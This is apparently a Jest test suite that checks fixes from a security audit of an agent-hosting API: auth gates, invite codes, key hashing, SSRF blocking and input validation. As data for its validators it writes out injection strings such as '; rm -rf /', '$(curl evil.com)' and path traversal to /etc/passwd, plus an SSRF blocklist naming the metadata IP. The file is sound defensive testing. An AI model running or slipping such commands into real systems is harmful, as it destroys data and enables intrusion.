/**
 * Security Audit End-to-End Tests
 *
 * Covers every finding from the agentbot security audit:
 *   CRIT-01  Outer Bearer auth gate (timingSafeEqual, length-guard)
 *   HIGH-01  Invite code auth (requireInternalAuth) + atomic consumption
 *   HIGH-04  API key SHA-256 hash lookup (no raw-key storage)
 *   MED-03   Plan-gating middleware (Stripe ID regex)
 *   MED-06   No shell injection in runCommand (spawn, not exec)
 *   LOW-04   SSRF blocklist (IPv4 private, CGN, IPv6 ULA, mapped-IPv4, zone-IDs)
 *
 * Positive-pattern propagation:
 *   Metrics, Provision, AI endpoints require Bearer auth (outer gate returns 403)
 *   Invite generate requires internal Bearer auth (returns 401 from own gate)
 *
 * KEY IMPLEMENTATION FACTS (determines correct expected values):
 *   - index.ts authenticate() returns 403 (Forbidden) for present-but-wrong token
 *   - index.ts authenticate() returns 401 (Unauthorized) for absent/malformed token
 *   - /api/invite, /api/underground, /api/mission-control are NOT behind outer gate
 *   - inviteRouter.requireInternalAuth reads process.env.INTERNAL_API_KEY at request time
 *   - registrationRouter uses middleware/auth.ts (reads headers, no Bearer check)
 *   - URL.hostname in Node.js 18+ preserves IPv6 brackets → bus.ts strips them
 */

import request from 'supertest';
import { createHash, timingSafeEqual } from 'crypto';

// ─── Mock heavy side-effects before any imports ──────────────────────────────

// 0. Mock modules with ESM-only deps or startup side-effects before they load
jest.mock('./services/wallet', () => ({
  WalletService: {
    createAgentWallet: jest.fn().mockResolvedValue({ address: '0xmock' }),
    transferUSDC:      jest.fn().mockResolvedValue({ txHash: '0xmock' }),
    getBalance:        jest.fn().mockResolvedValue('0'),
    encryptPrivateKey: jest.fn().mockReturnValue('encrypted'),
    decryptPrivateKey: jest.fn().mockReturnValue('0xprivkey'),
  },
}));

jest.mock('./services/amplification', () => ({
  AmplificationService: {
    amplify:          jest.fn().mockResolvedValue({}),
    getStatus:        jest.fn().mockResolvedValue({}),
  },
}));

jest.mock('./services/negotiation', () => ({
  NegotiationService: {
    createOffer:      jest.fn().mockResolvedValue({}),
    acceptOffer:      jest.fn().mockResolvedValue({}),
    listNegotiations: jest.fn().mockResolvedValue([]),
  },
}));

jest.mock('./services/ai-provider', () => ({
  AIService: {
    chat:      jest.fn().mockResolvedValue({ content: 'mock' }),
    prompt:    jest.fn().mockResolvedValue({ content: 'mock' }),
    getModels: jest.fn().mockResolvedValue([]),
  },
}));

jest.mock('bull', () => jest.fn().mockImplementation(() => ({
  process: jest.fn(),
  add:     jest.fn(),
  on:      jest.fn(),
})));

jest.mock('ethers', () => ({
  keccak256:     jest.fn().mockReturnValue('0xhash'),
  toUtf8Bytes:   jest.fn().mockReturnValue(new Uint8Array()),
  verifyMessage: jest.fn().mockReturnValue('0x0000000000000000000000000000000000000000'),
}));

// 1. Prevent real DB connections
jest.mock('pg', () => {
  const mockQuery = jest.fn().mockResolvedValue({ rows: [], rowCount: 0 });
  const MockPool  = jest.fn().mockImplementation(() => ({ query: mockQuery, end: jest.fn() }));
  (MockPool as any).__mockQuery = mockQuery;
  return { Pool: MockPool };
});

// 2. Prevent initDatabase() from hitting Postgres at module load
jest.mock('./services/db-init', () => ({
  initDatabase: jest.fn().mockResolvedValue(undefined),
}));

// 3. Prevent real Docker / shell calls — emit Buffer (not string) to satisfy Buffer.concat()
jest.mock('child_process', () => ({
  spawn: jest.fn().mockImplementation(() => {
    const EventEmitter = require('events');
    const proc         = new EventEmitter();
    proc.stdout        = new EventEmitter();
    proc.stderr        = new EventEmitter();
    setImmediate(() => {
      proc.stdout.emit('data', Buffer.from(''));
      proc.stderr.emit('data', Buffer.from(''));
      proc.emit('close', 0);
    });
    return proc;
  }),
}));

// 4. Stop background intervals from keeping the process alive
jest.useFakeTimers();

// ─── Import after mocks ───────────────────────────────────────────────────────
import app from './index';
import { AgentBusService } from './services/bus';

// ─── Key helpers ─────────────────────────────────────────────────────────────
// The real INTERNAL_API_KEY is loaded by dotenv.config() inside index.ts at
// module-load time.  We read it after the import so we always use the actual value.
const realApiKey = () => process.env.INTERNAL_API_KEY || 'dev-api-key-build-only';
const validAuth  = () => `Bearer ${realApiKey()}`;

// A wrong key of the SAME length (so the length guard is bypassed and
// timingSafeEqual is the one that rejects it)
const wrongKeySameLength = () => {
  const k = realApiKey();
  // Flip all chars to be clearly different, same length
  return k.split('').map(c => c === 'a' ? 'z' : 'a').join('').slice(0, k.length).padEnd(k.length, 'b');
};
const wrongAuth = () => `Bearer ${wrongKeySameLength()}`;

// ─────────────────────────────────────────────────────────────────────────────
// CRIT-01: Outer Bearer auth gate
// ─────────────────────────────────────────────────────────────────────────────
describe('CRIT-01 — Outer Bearer auth gate', () => {
  it('returns 401 when Authorization header is absent', async () => {
    const res = await request(app).get('/api/openclaw/version');
    expect(res.status).toBe(401);
  });

  it('returns 401 when Authorization header is malformed (no Bearer prefix)', async () => {
    const res = await request(app)
      .get('/api/openclaw/version')
      .set('Authorization', realApiKey()); // missing "Bearer " prefix
    expect(res.status).toBe(401);
  });

  it('returns 403 (Forbidden) when Bearer token is present-but-wrong', async () => {
    // NOTE: index.ts authenticate() uses 403 for wrong-but-present token,
    // 401 for absent/malformed.  Both are correct security responses.
    const res = await request(app)
      .get('/api/openclaw/version')
      .set('Authorization', wrongAuth());
    expect(res.status).toBe(403);
  });

  it('passes when correct Bearer token is supplied', async () => {
    const res = await request(app)
      .get('/api/openclaw/version')
      .set('Authorization', validAuth());
    // 200 or 500 (no Docker in test env) — but never 401/403
    expect(res.status).not.toBe(401);
    expect(res.status).not.toBe(403);
  });

  it('uses timing-safe comparison: length-mismatched buffers are rejected without crash', () => {
    // Documents the pre-condition for safety: must guard length before timingSafeEqual
    const provided = Buffer.from('short');
    const expected = Buffer.from('a-much-longer-expected-value-here');
    let result: boolean;
    if (provided.length !== expected.length) {
      result = false; // safe path — no timingSafeEqual call
    } else {
      result = timingSafeEqual(provided, expected);
    }
    expect(result).toBe(false);
  });

  it('security headers: x-powered-by is not exposed', async () => {
    const res = await request(app).get('/health');
    expect(res.headers['x-powered-by']).toBeUndefined();
  });

  it('health check is publicly accessible (no auth required)', async () => {
    const res = await request(app).get('/health');
    expect(res.status).toBe(200);
    expect(res.body.status).toBe('ok');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// HIGH-01: Invite code generation requires internal auth
// ─────────────────────────────────────────────────────────────────────────────
describe('HIGH-01 — Invite code auth & atomic consumption', () => {
  it('POST /api/invite/generate → 401 without auth', async () => {
    const res = await request(app).post('/api/invite/generate');
    expect(res.status).toBe(401);
  });

  it('POST /api/invite/generate → 401 with wrong key (same length)', async () => {
    const res = await request(app)
      .post('/api/invite/generate')
      .set('Authorization', wrongAuth());
    expect(res.status).toBe(401);
  });

  it('POST /api/invite/validate → 400 when code is missing', async () => {
    const res = await request(app)
      .post('/api/invite/validate')
      .send({});
    expect(res.status).toBe(400);
    expect(res.body.valid).toBe(false);
  });

  it('POST /api/invite/validate → 400 when code is too short (< 12 chars)', async () => {
    const res = await request(app)
      .post('/api/invite/validate')
      .send({ code: 'abc' });
    expect(res.status).toBe(400);
    expect(res.body.valid).toBe(false);
  });

  it('POST /api/invite/validate → 400 when code is too long (> 12 chars)', async () => {
    const res = await request(app)
      .post('/api/invite/validate')
      .send({ code: 'aabbccddee1122' }); // 14 chars
    expect(res.status).toBe(400);
    expect(res.body.valid).toBe(false);
  });

  it('POST /api/invite/validate → 400 when code is unused/not found (rowCount=0)', async () => {
    // Pool mock returns rowCount:0 by default
    const res = await request(app)
      .post('/api/invite/validate')
      .send({ code: 'aabbccddee11' }); // exactly 12 chars
    expect(res.status).toBe(400);
    expect(res.body.valid).toBe(false);
  });

  it('POST /api/invite/validate → 200 when DB atomically consumes the code', async () => {
    const { Pool } = require('pg');
    Pool.__mockQuery.mockResolvedValueOnce({ rows: [{ code: 'aabbccddee11' }], rowCount: 1 });
    const res = await request(app)
      .post('/api/invite/validate')
      .send({ code: 'aabbccddee11' });
    expect(res.status).toBe(200);
    expect(res.body.valid).toBe(true);
  });

  it('invite generate uses timingSafeEqual (correct pattern)', () => {
    // Unit test the invite auth pattern
    const token    = Buffer.from('wrongtoken!!!!!!!!!!!!!!!!!!!!!!');
    const expected = Buffer.from(realApiKey());
    const safe = token.length === expected.length
      ? timingSafeEqual(token, expected)
      : false;
    expect(safe).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// HIGH-04: API key validated via SHA-256 hash lookup (not raw storage)
// ─────────────────────────────────────────────────────────────────────────────
describe('HIGH-04 — SHA-256 API key validation', () => {
  it('POST /api/validate-key → 401 when Authorization header is absent', async () => {
    // /api/validate-key is in registrationRouter, which uses its own Bearer check
    const res = await request(app).post('/api/validate-key');
    expect(res.status).toBe(401);
  });

  it('POST /api/validate-key → 401 when key has no DB match', async () => {
    // Send a valid outer Bearer token but an unknown key for the validate-key route
    // (Pool returns rowCount:0 → no match)
    const res = await request(app)
      .post('/api/validate-key')
      .set('Authorization', validAuth());
    expect(res.status).toBe(401);
    expect(res.body.valid).toBe(false);
  });

  it('SHA-256: raw key is never the value compared — only its hex digest', () => {
    const rawKey = 'my-super-secret-api-key';
    const hash   = createHash('sha256').update(rawKey).digest('hex');
    expect(hash).toHaveLength(64);
    expect(hash).toMatch(/^[0-9a-f]+$/);
    expect(hash).not.toBe(rawKey);
  });

  it('POST /api/validate-key → valid:true when DB returns a matching row', async () => {
    const { Pool } = require('pg');
    Pool.__mockQuery.mockResolvedValueOnce({
      rows: [{ user_id: 'usr_abc123', plan: 'solo' }],
      rowCount: 1,
    });
    const res = await request(app)
      .post('/api/validate-key')
      .set('Authorization', validAuth());
    expect(res.status).toBe(200);
    expect(res.body.valid).toBe(true);
    expect(res.body.userId).toBe('usr_abc123');
    expect(res.body.plan).toBe('solo');
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// MED-03: Plan-gating middleware — Stripe subscription ID regex
// ─────────────────────────────────────────────────────────────────────────────
describe('MED-03 — Plan middleware Stripe ID validation', () => {
  const regex = /^sub_[a-zA-Z0-9]+$/;

  it('accepts a valid Stripe subscription ID', () => {
    expect(regex.test('sub_1OPz5wLkdIwHu7ix5GZRvNOw')).toBe(true);
    expect(regex.test('sub_ABC123')).toBe(true);
  });

  it('rejects a subscription ID with path-traversal characters', () => {
    expect(regex.test('sub_../../etc/passwd')).toBe(false);
    expect(regex.test('sub_; DROP TABLE')).toBe(false);
    expect(regex.test('sub_$(whoami)')).toBe(false);
  });

  it('rejects empty or bare prefix', () => {
    expect(regex.test('')).toBe(false);
    expect(regex.test('sub_')).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// MED-06: Shell injection prevention — runCommand uses spawn, not exec
// ─────────────────────────────────────────────────────────────────────────────
describe('MED-06 — No shell injection via runCommand', () => {
  it('runCommand does not invoke a shell (spawn called with cmd + args array)', () => {
    const { spawn } = require('child_process');
    spawn.mockClear();

    const { runCommand } = require('./utils');
    // spawn is called synchronously inside runCommand before the promise chain.
    // We do NOT await — we just want to verify the spawn call arguments.
    runCommand('echo', ['hello world']).catch(() => {});

    // spawn must have been called by now (synchronous setup)
    expect(spawn).toHaveBeenCalled();
    const [cmd, args, opts = {}] = spawn.mock.calls[0];

    // cmd must be the binary — NOT 'sh', '/bin/sh', or 'bash'
    expect(cmd).toBe('echo');
    // args is an array of discrete tokens — shell never parses them
    expect(Array.isArray(args)).toBe(true);
    expect(args).toContain('hello world');
    // shell:true would cause Node to invoke /bin/sh — must be absent or false
    expect((opts as any).shell).not.toBe(true);
  });

  it('malicious input arrives as a literal argument element, not shell-parsed', () => {
    const maliciousInput = '; rm -rf /; echo pwned';
    const args           = ['docker', 'exec', 'container', 'cat', maliciousInput];
    // With spawn, each element is a single token — the shell never sees it
    expect(args[4]).toBe(maliciousInput);
    // If a shell were used, 'rm -rf /' would execute.  With spawn, it's just a literal.
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// LOW-04: SSRF blocklist — validateWebhookUrl
// ─────────────────────────────────────────────────────────────────────────────
describe('LOW-04 — SSRF blocklist', () => {
  const validate = (url: string) =>
    (AgentBusService as any).validateWebhookUrl(url);

  const blocked = [
    // IPv4 private / reserved
    'https://localhost/hook',
    'https://127.0.0.1/hook',
    'https://127.255.255.255/hook',
    'https://0.0.0.0/hook',
    'https://10.0.0.1/hook',
    'https://10.255.255.255/hook',
    'https://172.16.0.1/hook',
    'https://172.31.255.255/hook',
    'https://192.168.1.1/hook',
    'https://192.168.255.255/hook',
    'https://169.254.169.254/hook',      // AWS/GCP metadata server
    'https://169.254.0.1/hook',
    // IANA shared / CGN (RFC 6598) — 100.64.0.0/10
    'https://100.64.0.1/hook',
    'https://100.127.255.255/hook',
    // IPv6 loopback
    'https://[::1]/hook',
    // IPv6 unique-local (fc00::/7 → fc00:: – fdff::)
    'https://[fc00::1]/hook',
    'https://[fd00::1]/hook',
    'https://[fdff::1]/hook',
    // IPv6 link-local
    'https://[fe80::1]/hook',
    'https://[fe90::1]/hook',
    'https://[feb0::1]/hook',
    'https://[febf::1]/hook',
    // IPv6-mapped IPv4 (::ffff:*) — URL normalises to hex but still starts with ::ffff:
    'https://[::ffff:192.168.1.1]/hook',
    'https://[::ffff:10.0.0.1]/hook',
    // IPv4-compatible IPv6 (::127.0.0.1 normalises to ::7f00:1, caught by /^::/ rule)
    'https://[::127.0.0.1]/hook',
  ];

  const allowed = [
    'https://hooks.example.com/webhook',
    'https://discord.com/api/webhooks/123/abc',
    'https://8.8.8.8/hook',             // public IP
    'https://1.1.1.1/hook',             // Cloudflare
    'https://172.15.0.1/hook',          // NOT in 172.16-31 range
    'https://172.32.0.1/hook',          // NOT in 172.16-31 range
    'https://100.63.255.255/hook',      // just below CGN range
    'https://100.128.0.1/hook',         // just above CGN range
  ];

  it.each(blocked)('blocks private/internal URL: %s', (url) => {
    expect(() => validate(url)).toThrow();
  });

  it.each(allowed)('allows public URL: %s', (url) => {
    expect(() => validate(url)).not.toThrow();
  });

  it('blocks HTTP (non-HTTPS) even for public IPs', () => {
    expect(() => validate('http://hooks.example.com/webhook')).toThrow(/HTTPS/);
  });

  it('blocks malformed URLs', () => {
    expect(() => validate('not-a-url')).toThrow(/Invalid/);
    expect(() => validate('')).toThrow();
  });

  it('blocks IPv6 zone IDs (e.g. fe80::1%eth0)', () => {
    expect(() => validate('https://[fe80::1%25eth0]/hook')).toThrow();
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Positive patterns: Protected routes return 403 for wrong Bearer token
// (confirms outer gate is active on these routes)
// ─────────────────────────────────────────────────────────────────────────────
describe('Positive patterns — Protected routes require valid Bearer auth', () => {
  const userId = 'usr_test123';

  it('GET /api/metrics/:userId/historical → 401 (no auth)', async () => {
    const res = await request(app).get(`/api/metrics/${userId}/historical`);
    expect(res.status).toBe(401);
  });

  it('GET /api/metrics/:userId/performance → 401 (no auth)', async () => {
    const res = await request(app).get(`/api/metrics/${userId}/performance`);
    expect(res.status).toBe(401);
  });

  it('GET /api/metrics/:userId/summary → 401 (no auth)', async () => {
    const res = await request(app).get(`/api/metrics/${userId}/summary`);
    expect(res.status).toBe(401);
  });

  it('GET /api/metrics/:userId/historical → 403 (wrong token)', async () => {
    const res = await request(app)
      .get(`/api/metrics/${userId}/historical`)
      .set('Authorization', wrongAuth());
    expect(res.status).toBe(403);
  });

  it('POST /api/provision → 401 (no auth)', async () => {
    const res = await request(app).post('/api/provision').send({ plan: 'solo' });
    expect(res.status).toBe(401);
  });

  it('POST /api/provision → 403 (wrong token)', async () => {
    const res = await request(app)
      .post('/api/provision')
      .set('Authorization', wrongAuth())
      .send({ plan: 'solo' });
    expect(res.status).toBe(403);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Positive patterns: IIS/proxy bypass headers are stripped
// ─────────────────────────────────────────────────────────────────────────────
describe('Positive patterns — Bypass headers stripped before routing', () => {
  it('x-original-url cannot bypass auth to reach a protected route', async () => {
    const res = await request(app)
      .get('/api/openclaw/version')
      .set('x-original-url', '/health')
      .set('x-rewrite-url', '/health');
    // Route is still /api/openclaw/version (headers stripped) → no auth → 401
    expect(res.status).toBe(401);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Registration routes — use own middleware (not outer Bearer gate)
// ─────────────────────────────────────────────────────────────────────────────
describe('Registration routes — own auth middleware (middleware/auth.ts)', () => {
  it('POST /api/validate-key → 401 without Authorization header', async () => {
    const res = await request(app).post('/api/validate-key');
    expect(res.status).toBe(401);
  });

  it('POST /api/register-home → accessible (uses header-based auth, not Bearer gate)', async () => {
    // registrationRouter authenticate just reads x-user-* headers — no Bearer check.
    // Without those headers, userId = 'anonymous' but request proceeds.
    const res = await request(app)
      .post('/api/register-home')
      .send({ userId: 'test-user' });
    // 200 (DB upsert succeeds with mock) or 500 — but not 401/403
    expect([200, 500]).toContain(res.status);
  });

  it('POST /api/heartbeat → public endpoint returns 200', async () => {
    const res = await request(app)
      .post('/api/heartbeat')
      .send({ userId: 'test-user' });
    expect(res.status).toBe(200);
    expect(res.body.success).toBe(true);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Docker image / volume name input validation
// ─────────────────────────────────────────────────────────────────────────────
describe('Input validation — Docker image & volume names', () => {
  const IMAGE_RE  = /^(?:(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*(?::[0-9]{2,5})?)\/)?[a-z0-9]+(?:[._-][a-z0-9]+)*(?:\/[a-z0-9]+(?:[._-][a-z0-9]+)*)*(?::[\w][\w.-]{0,127})?(?:@sha256:[A-Fa-f0-9]{64})?$/;
  const VOLUME_RE = /^[A-Za-z0-9][A-Za-z0-9_-]*$/;

  it('IMAGE_REGEX allows valid image references', () => {
    expect(IMAGE_RE.test('ghcr.io/openclaw/openclaw:2026.3.24')).toBe(true);
    expect(IMAGE_RE.test('nginx:latest')).toBe(true);
    expect(IMAGE_RE.test('ubuntu')).toBe(true);
  });

  it('IMAGE_REGEX blocks shell metacharacters and path-traversal', () => {
    expect(IMAGE_RE.test('../../../etc/passwd')).toBe(false);
    expect(IMAGE_RE.test('image; rm -rf /')).toBe(false);
    expect(IMAGE_RE.test('$(curl evil.com)')).toBe(false);
    expect(IMAGE_RE.test('image`whoami`')).toBe(false);
  });

  it('VOLUME_RE blocks special characters', () => {
    expect(VOLUME_RE.test('openclaw-data-usr123')).toBe(true);
    expect(VOLUME_RE.test('openclaw_data')).toBe(true);
    expect(VOLUME_RE.test('../escape')).toBe(false);
    expect(VOLUME_RE.test('vol; rm -rf /')).toBe(false);
    expect(VOLUME_RE.test('')).toBe(false);
  });
});

// ─────────────────────────────────────────────────────────────────────────────
// Rate limiting headers present on API routes
// ─────────────────────────────────────────────────────────────────────────────
describe('Rate limiting headers present', () => {
  it('responses to /api/* include RateLimit headers', async () => {
    const res = await request(app)
      .get('/api/openclaw/version')
      .set('Authorization', validAuth());
    const hasHeader =
      res.headers['ratelimit-limit']     !== undefined ||
      res.headers['x-ratelimit-limit']   !== undefined ||
      res.headers['ratelimit-remaining'] !== undefined;
    expect(hasHeader).toBe(true);
  });
});
